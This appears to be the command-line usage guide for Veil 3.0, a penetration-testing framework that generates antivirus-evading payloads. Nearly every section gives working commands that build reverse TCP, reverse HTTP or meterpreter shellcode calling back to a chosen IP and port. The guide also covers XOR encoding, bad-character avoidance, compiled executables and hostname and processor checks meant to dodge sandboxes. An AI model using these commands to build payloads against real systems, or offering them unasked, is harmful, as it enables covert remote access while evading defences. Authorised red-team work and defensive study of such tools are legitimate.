# Veil 3.0 Command Line Usage
Most Veil users will utilize Veil’s interactive menu to generate shellcode and/or Veil payloads. 
However, I expect while only a minority of users take advantage of the command line options, that they do so quite heavily. 
Therefore, I wanted to ensure that a command line interface exists for Veil in the event the user wants to script its usage (or for any other means). 
With Veil’s 3.0 release, some of the options are the same, but a few more command line options have been introduced to the tool, which I hope to explain here.

## Ordnance
I’ll address how to use Ordnance within Veil all from the command line, this should (ideally) be fairly straightforward. 
In case you haven’t used Ordnance before, it is a tool that is used to quickly generate shellcode for a variety of payloads vs. relying on msfvenom to generate the shellcode for you.

~~~
./Veil.py -t Ordnance --list-payloads
~~~
This command tells Veil to list all payloads (–list-payloads) for the tool Ordnance (-t Ordnance).

~~~
./Veil.py -t Ordnance --list-encoders
~~~
This command tells Veil to list all encoders (–list-encoders) for the tool Ordnance (-t Ordnance).

~~~
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234
~~~
This command specifies to use Ordnance (-t Ordnance) and generate a reverse tcp payload (–ordnance-payload rev_tcp) which connects back to the ip 192.168.1.20 (–ip 192.168.1.20) on port 1234 (–port 1234).

~~~
./Veil.py -t Ordnance --ordnance-payload rev_http --ip 192.168.1.21 --port 1235 -e xor -b \\x13\\x98
~~~
This command specifies to use Ordnance (-t Ordnance) and generates a reverse http payload which connects back to the ip 192.168.1.21 (–ip 192.168.1.21) on port 1235 (–port 1235). 
The command then further specifies that an xor encoder should be applied (-e xor) and the bad characters \x13\x98 should be avoided (-b \\x13\\x98).

## Evasion
Let’s go over a couple commands and I’ll explain their components:

~~~
./Veil.py -t Evasion --list-payloads
~~~
This command tells Veil to list all payloads (–list-payloads) for the tool Evasion (-t Evasion).

~~~
./Veil.py -t Evasion -p 33 --ordnance-payload rev_tcp --ip 192.168.1.3 --port 8675 -o christest
~~~
This command will actually generate an executable payload. It specifies that Evasion’s (-t Evasion) payload number 33 (-p 33) is selected by the user. 
For shellcode generation, use Ordnance’s rev_tcp payload (–ordnance-payload rev_tcp), and set the callback ip to 192.168.1.3 (–ip 192.168.1.3) and callback port to 8675 (–port 8675). 
Finally, name the output file christest (-o christest).

The main thing to note with this command is that it is using Ordnance for shellcode generation.

~~~
./Veil.py -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris
~~~
This command is fairly similar to the above command, but relies on msfvenom for generating shellcode. 
The command states to use Evasion’s (-t Evasion) payload number 41 (-p 41) and to generate windows/meterpreter/reverse_tcp shellcode via msfvenom with the callback IP set to 192.168.1.4 (–ip 192.168.1.4) and callback port set to 8675 (–port 8675). 
Finally, it names the output file chris (-o chris).

Now, what if you want to specify some of the required options for a payload Here’s your answer!

~~~
./Veil.py -t Evasion -p 34 --ordnance-payload rev_tcp --ip 192.168.1.5 --port 8677 -o chrisout -c hostname=thegrid processors=2
~~~
This command specifies to use Evasion’s (-t Evasion) payload number 34 (-p 34) and have ordnance generate a reverse tcp payload (–ordnance-payload rev_tcp) with a callback IP set to 192.168.1.5 (–ip 192.168.1.5) with a callback port of 8677 (–port 8677). 
The output file is named chrisout (-o chrisout), and two checks are being specified. 
The payload will explicitly check to make sure the hostname of the system the payload is running on is “thegrid” (-c hostname=thegrid) and that there are at least two (2) processors on the system (processors=2). 
Yes, there is a space between hostname=thegrid and processors=2.
If you only wanted to check for the hostname, you would remove the processors=2 from the -c command (the command would now look like -c hostname=thegrid). 
Embedding basic checks, such as these, within your payload(s) can be useful when attempting to enumerate and avoid sandboxes.

~~~
./Veil.py --clean
~~~
Ideally, this one is self-explanatory. If you’ve created multiple payloads and just want to remove all the compiled output, source code, handler files, and tracked hashes, run this command and Veil will remove everything.

Hopefully this helps to explain Veil’s command line interface. 
However, if you have any questions, please don’t hesitate to reach out over twitter (@VeilFramework or @ChrisTruncer) and I’ll be happy to answer any questions. 
If you encounter any bugs, feel free to create a Github issue!